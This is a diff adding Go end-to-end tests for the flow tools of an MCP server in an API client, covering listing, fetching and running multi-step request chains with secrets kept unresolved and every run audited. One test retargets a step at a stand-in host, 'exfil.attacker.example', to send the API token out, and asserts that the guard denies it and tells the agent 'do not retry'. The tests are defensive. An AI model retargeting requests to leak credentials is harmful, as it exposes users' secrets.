@@ -855,6 +855,385 @@ func TestMCPE2ERunRequestDeniedOverrideIsAuditedAsDenied(t *testing.T) {
 	}
 }
 
+// --- 1b. the flow tier over the wire -----------------------------------------
+
+// e2eFlowTarget is a live host plus the two requests and the environment
+// variable a flow needs to reach it. The fixture's own requests point at
+// api.e2e-fixture.example.com, which is right for the read tier and unreachable
+// for a run, so a flow that actually executes needs its own.
+//
+// The URLs are TEMPLATED on {{flowBase}} rather than literal, which is what
+// makes the denial test below possible at all: retargeting is done through a
+// step var, exactly as an agent would do it.
+type e2eFlowTarget struct {
+	server   *httptest.Server
+	firstID  string
+	secondID string
+
+	mu       sync.Mutex
+	requests []e2eFlowRequest
+}
+
+type e2eFlowRequest struct {
+	path       string
+	body       string
+	authHeader string
+}
+
+func newE2EFlowTarget(t *testing.T, f *e2eFixture) *e2eFlowTarget {
+	t.Helper()
+	target := &e2eFlowTarget{}
+	target.server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		body, _ := io.ReadAll(r.Body)
+		target.mu.Lock()
+		target.requests = append(target.requests, e2eFlowRequest{
+			path: r.URL.Path, body: string(body), authHeader: r.Header.Get("Authorization"),
+		})
+		target.mu.Unlock()
+		w.Header().Set("Content-Type", "application/json")
+		if r.URL.Path == "/second" {
+			w.WriteHeader(http.StatusCreated)
+			_, _ = w.Write([]byte(`{"terminal":{"id":"term_7","state":"created"}}`))
+			return
+		}
+		_, _ = w.Write([]byte(`{"data":{"id":"store_42"}}`))
+	}))
+	t.Cleanup(target.server.Close)
+
+	f.app.mu.Lock()
+	workspace := &f.app.state.Workspaces[0]
+	collection := &workspace.Collections[0]
+	for ei := range workspace.GlobalEnvironments {
+		if workspace.GlobalEnvironments[ei].ID == "env-e2e-global" {
+			workspace.GlobalEnvironments[ei].Variables = append(workspace.GlobalEnvironments[ei].Variables,
+				Variable{ID: "e2e-var-flow-base", Name: "flowBase", Value: target.server.URL, Enabled: true})
+		}
+	}
+
+	first := types.NewRequestItem("Flow step one", "http", len(collection.Items)+1)
+	first.Method = http.MethodPost
+	first.URL = "{{flowBase}}/first"
+	first.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
+	first.Body = types.RequestBody{Mode: "json", JSON: `{"code":"{{code}}"}`}
+	collection.Items = append(collection.Items, first)
+
+	second := types.NewRequestItem("Flow step two", "http", len(collection.Items)+1)
+	second.Method = http.MethodPost
+	second.URL = "{{flowBase}}/second"
+	second.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
+	second.Body = types.RequestBody{Mode: "json", JSON: `{"storeId":"{{storeId}}"}`}
+	collection.Items = append(collection.Items, second)
+
+	target.firstID = first.ID
+	target.secondID = second.ID
+	f.app.mu.Unlock()
+	return target
+}
+
+func (target *e2eFlowTarget) recorded() []e2eFlowRequest {
+	target.mu.Lock()
+	defer target.mu.Unlock()
+	return append([]e2eFlowRequest{}, target.requests...)
+}
+
+// installE2EFlow plants a flow on the fixture collection directly, the way
+// flow_run_test.go's fixture does: the flow tier's write half does not exist
+// yet, and going through CreateFlow would only add a disk write to a test about
+// reading and running.
+func (f *e2eFixture) installE2EFlow(t *testing.T, flow types.Flow) {
+	t.Helper()
+	f.app.mu.Lock()
+	defer f.app.mu.Unlock()
+	collection := &f.app.state.Workspaces[0].Collections[0]
+	collection.Flows = append(collection.Flows, types.CloneFlow(flow))
+}
+
+// The read half of the flow tier over real HTTP. The step var naming the
+// environment's secret is the assertion that matters: it must come back as the
+// literal {{apiToken}}, because flow scope never resolves it either — reporting
+// it any other way would be inventing a resolution the runner does not do.
+func TestMCPE2EFlowToolsReturnDefinitionsWithTemplatesUnresolved(t *testing.T) {
+	f := newE2EFixture(t)
+	allSentinels := []string{e2eSentinelHeaderAuth, e2eSentinelPassword, e2eSentinelEnvSecret, e2eSentinelURLQuery}
+
+	f.installE2EFlow(t, types.Flow{
+		ID:          "flow_e2e_read",
+		Name:        "Provision terminal",
+		Description: "lookup then create",
+		Inputs:      []types.FlowInput{{Name: "storeCode", Required: true, Description: "Store short code"}},
+		Steps: []types.FlowStep{
+			{
+				ID:        "lookup",
+				RequestID: f.reqGraphQLID,
+				Vars:      map[string]string{"code": "{{storeCode}}", "token": "{{apiToken}}"},
+				Extract:   []types.FlowExtract{{Name: "storeId", From: "body", Path: "$.data.store.id"}},
+				Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
+			},
+			{ID: "ping", RequestID: f.reqLiteralAuthID},
+		},
+		Outputs: []types.FlowOutput{{Name: "storeId", Value: "{{storeId}}"}},
+	})
+
+	listText, listErr, listRaw := f.callTool(t, "list_flows", map[string]any{"collectionId": f.collectionID})
+	if listErr {
+		t.Fatalf("list_flows returned isError: %s", listText)
+	}
+	var summaries []struct {
+		ID        string `json:"id"`
+		Name      string `json:"name"`
+		StepCount int    `json:"stepCount"`
+		Inputs    []struct {
+			Name     string `json:"name"`
+			Required bool   `json:"required"`
+		} `json:"inputs"`
+	}
+	if err := json.Unmarshal([]byte(listText), &summaries); err != nil {
+		t.Fatalf("decode list_flows: %v (text=%s)", err, listText)
+	}
+	if len(summaries) != 1 || summaries[0].ID != "flow_e2e_read" || summaries[0].StepCount != 2 {
+		t.Fatalf("list_flows = %+v", summaries)
+	}
+	if len(summaries[0].Inputs) != 1 || summaries[0].Inputs[0].Name != "storeCode" || !summaries[0].Inputs[0].Required {
+		t.Errorf("the declared inputs did not reach the row: %+v", summaries[0].Inputs)
+	}
+	assertNoSentinel(t, "list_flows", listRaw, allSentinels...)
+
+	getText, getErr, getRaw := f.callTool(t, "get_flow", map[string]any{
+		"collectionId": f.collectionID, "flowId": "flow_e2e_read",
+	})
+	if getErr {
+		t.Fatalf("get_flow returned isError: %s", getText)
+	}
+	var detail struct {
+		Steps []struct {
+			ID        string            `json:"id"`
+			RequestID string            `json:"requestId"`
+			Vars      map[string]string `json:"vars"`
+			Extract   []struct {
+				Name string `json:"name"`
+				Path string `json:"path"`
+			} `json:"extract"`
+		} `json:"steps"`
+		Outputs []struct {
+			Name  string `json:"name"`
+			Value string `json:"value"`
+		} `json:"outputs"`
+	}
+	if err := json.Unmarshal([]byte(getText), &detail); err != nil {
+		t.Fatalf("decode get_flow: %v (text=%s)", err, getText)
+	}
+	if len(detail.Steps) != 2 {
+		t.Fatalf("get_flow returned %d steps, want 2", len(detail.Steps))
+	}
+	if detail.Steps[0].Vars["token"] != "{{apiToken}}" {
+		t.Errorf("the step var naming the secret is %q, want the literal {{apiToken}} — NOT resolved", detail.Steps[0].Vars["token"])
+	}
+	if detail.Steps[0].Vars["code"] != "{{storeCode}}" {
+		t.Errorf("the step var naming an input is %q, want the literal {{storeCode}}", detail.Steps[0].Vars["code"])
+	}
+	if detail.Steps[0].RequestID != f.reqGraphQLID {
+		t.Errorf("the step's requestId is %q; it is what get_request is called with next", detail.Steps[0].RequestID)
+	}
+	if len(detail.Outputs) != 1 || detail.Outputs[0].Value != "{{storeId}}" {
+		t.Errorf("outputs did not survive: %+v", detail.Outputs)
+	}
+	assertNoSentinel(t, "get_flow", getRaw, allSentinels...)
+}
+
+// The run half over real HTTP: an agent runs a chain the user wrote, each step
+// goes to a live host with the secret resolving inside LiteAPI, the values one
+// step extracted reach the next, and the whole call lands in the audit log.
+func TestMCPE2ERunFlowChainsStepsAndLandsInTheAuditLog(t *testing.T) {
+	f := newE2EFixture(t)
+	allSentinels := []string{e2eSentinelHeaderAuth, e2eSentinelPassword, e2eSentinelEnvSecret, e2eSentinelURLQuery}
+	target := newE2EFlowTarget(t, f)
+
+	f.installE2EFlow(t, types.Flow{
+		ID:     "flow_e2e_run",
+		Name:   "Two step chain",
+		Inputs: []types.FlowInput{{Name: "storeCode", Required: true}},
+		Steps: []types.FlowStep{
+			{
+				ID:        "lookup",
+				RequestID: target.firstID,
+				Vars:      map[string]string{"code": "{{storeCode}}"},
+				Extract:   []types.FlowExtract{{Name: "storeId", From: "body", Path: "$.data.id"}},
+				Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
+			},
+			{
+				ID:        "create",
+				RequestID: target.secondID,
+				Vars:      map[string]string{"storeId": "{{storeId}}"},
+				Extract:   []types.FlowExtract{{Name: "terminalId", From: "body", Path: "$.terminal.id"}},
+				Assert:    []types.FlowAssert{{Type: "status", In: []int{200, 201}}},
+			},
+		},
+		Outputs: []types.FlowOutput{{Name: "terminalId", Value: "{{terminalId}}"}},
+	})
+
+	text, isError, raw := f.callTool(t, "run_flow", map[string]any{
+		"collectionId": f.collectionID,
+		"flowId":       "flow_e2e_run",
+		"inputs":       map[string]any{"storeCode": "DHK-04"},
+	})
+	if isError {
+		t.Fatalf("run_flow returned isError: %s", text)
+	}
+	assertNoSentinel(t, "run_flow", raw, allSentinels...)
+
+	var outcome struct {
+		OK    bool `json:"ok"`
+		Steps []struct {
+			StepID     string            `json:"stepId"`
+			Status     int               `json:"status"`
+			Extracted  map[string]string `json:"extracted"`
+			Assertions []struct {
+				OK bool `json:"ok"`
+			} `json:"assertions"`
+		} `json:"steps"`
+		Outputs map[string]string `json:"outputs"`
+	}
+	if err := json.Unmarshal([]byte(text), &outcome); err != nil {
+		t.Fatalf("decode run_flow result: %v (text=%s)", err, text)
+	}
+	if !outcome.OK || len(outcome.Steps) != 2 {
+		t.Fatalf("outcome = %+v", outcome)
+	}
+	if outcome.Steps[0].Extracted["storeId"] != "store_42" || outcome.Steps[1].Extracted["terminalId"] != "term_7" {
+		t.Errorf("extractions did not reach the agent: %+v", outcome.Steps)
+	}
+	if outcome.Steps[1].Status != http.StatusCreated {
+		t.Errorf("step 2 status = %d, want 201", outcome.Steps[1].Status)
+	}
+	if outcome.Outputs["terminalId"] != "term_7" {
+		t.Errorf("declared outputs = %+v", outcome.Outputs)
+	}
+
+	recorded := target.recorded()
+	if len(recorded) != 2 {
+		t.Fatalf("the target saw %d requests, want 2: %+v", len(recorded), recorded)
+	}
+	if !strings.Contains(recorded[0].body, `"code":"DHK-04"`) {
+		t.Errorf("step 1 did not carry the input to the wire: %s", recorded[0].body)
+	}
+	if !strings.Contains(recorded[1].body, `"storeId":"store_42"`) {
+		t.Errorf("step 2 did not carry step 1's extraction to the wire: %s", recorded[1].body)
+	}
+	// The negative control for the sentinel sweep above: the secret really did
+	// resolve at send time on both steps.
+	for index, request := range recorded {
+		if request.authHeader != "Bearer "+e2eSentinelEnvSecret {
+			t.Errorf("step %d sent Authorization %q; the secret did not resolve at send time", index+1, request.authHeader)
+		}
+	}
+
+	entries, err := f.app.GetMCPAuditLog(0)
+	if err != nil {
+		t.Fatalf("GetMCPAuditLog: %v", err)
+	}
+	if len(entries) == 0 || entries[0].Tool != "run_flow" || entries[0].Outcome != "ok" {
+		t.Fatalf("the newest audit entry is %+v, want run_flow/ok", entries)
+	}
+	if !strings.Contains(entries[0].ArgsSummary, "flow_e2e_run") {
+		t.Errorf("the audited args summary does not name the flow: %q", entries[0].ArgsSummary)
+	}
+	audited, err := json.Marshal(entries)
+	if err != nil {
+		t.Fatalf("marshal the audit log: %v", err)
+	}
+	assertNoSentinel(t, "audit log", audited, allSentinels...)
+}
+
+// The guard applies to EVERY step, not once per flow. Step 1 goes to the host
+// the collection already uses; step 2's own vars retarget {{flowBase}} at a host
+// nothing has ever sent {{apiToken}} to, and there is no frontend to approve it —
+// so the flow stops there, the agent is told why, and the panel shows a refusal
+// rather than a failure.
+func TestMCPE2ERunFlowRetargetedStepIsDeniedAndAuditedAsDenied(t *testing.T) {
+	f := newE2EFixture(t)
+	target := newE2EFlowTarget(t, f)
+
+	f.installE2EFlow(t, types.Flow{
+		ID:   "flow_e2e_retarget",
+		Name: "Retarget at step two",
+		Steps: []types.FlowStep{
+			{
+				ID:        "lookup",
+				RequestID: target.firstID,
+				Extract:   []types.FlowExtract{{Name: "storeId", From: "body", Path: "$.data.id"}},
+				Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
+			},
+			{
+				ID:        "create",
+				RequestID: target.secondID,
+				Vars:      map[string]string{"flowBase": "http://exfil.attacker.example"},
+			},
+		},
+	})
+
+	text, isError, raw := f.callTool(t, "run_flow", map[string]any{
+		"collectionId": f.collectionID, "flowId": "flow_e2e_retarget",
+	})
+	if !isError {
+		t.Fatalf("the retargeted step was allowed to run: %s", text)
+	}
+	if !strings.Contains(text, "exfil.attacker.example") || !strings.Contains(text, "apiToken") {
+		t.Errorf("the denial should name the host and the secret: %s", text)
+	}
+	// The message tells the agent what to do instead — the one sentence that
+	// stops it retrying or routing around the guard.
+	if !strings.Contains(text, "do not retry") {
+		t.Errorf("the denial does not tell the agent to stop and ask: %s", text)
+	}
+	assertNoSentinel(t, "run_flow(retargeted)", raw, e2eSentinelEnvSecret)
+
+	// Step 1 ran; step 2 never reached the wire.
+	recorded := target.recorded()
+	if len(recorded) != 1 || recorded[0].path != "/first" {
+		t.Fatalf("the target saw %+v; the retargeted step must never have been sent", recorded)
+	}
+
+	entries, err := f.app.GetMCPAuditLog(0)
+	if err != nil {
+		t.Fatalf("GetMCPAuditLog: %v", err)
+	}
+	if len(entries) == 0 || entries[0].Tool != "run_flow" || entries[0].Outcome != "denied" {
+		t.Fatalf("the newest audit entry is %+v, want run_flow/denied", entries)
+	}
+}
+
+// An input the flow does not declare is refused over the wire too, with the
+// declared list named — and nothing is sent, so a typo cannot run a chain
+// against an empty value.
+func TestMCPE2ERunFlowUndeclaredInputIsRefused(t *testing.T) {
+	f := newE2EFixture(t)
+	target := newE2EFlowTarget(t, f)
+
+	f.installE2EFlow(t, types.Flow{
+		ID:     "flow_e2e_inputs",
+		Name:   "One step",
+		Inputs: []types.FlowInput{{Name: "storeCode", Required: true}},
+		Steps: []types.FlowStep{{
+			ID: "lookup", RequestID: target.firstID,
+			Vars: map[string]string{"code": "{{storeCode}}"},
+		}},
+	})
+
+	text, isError, _ := f.callTool(t, "run_flow", map[string]any{
+		"collectionId": f.collectionID, "flowId": "flow_e2e_inputs",
+		"inputs": map[string]any{"storeCoden": "DHK-04"},
+	})
+	if !isError {
+		t.Fatalf("an undeclared input was accepted: %s", text)
+	}
+	if !strings.Contains(text, "storeCoden") || !strings.Contains(text, "storeCode") {
+		t.Errorf("the refusal should name the input and the declared list: %s", text)
+	}
+	if recorded := target.recorded(); len(recorded) != 0 {
+		t.Fatalf("a refused run still sent %d requests: %+v", len(recorded), recorded)
+	}
+}
+
 // --- 2. adversarial probes ---------------------------------------------------
 
 func TestMCPE2EWrongTokenIsRejectedWithoutEchoingEitherToken(t *testing.T) {
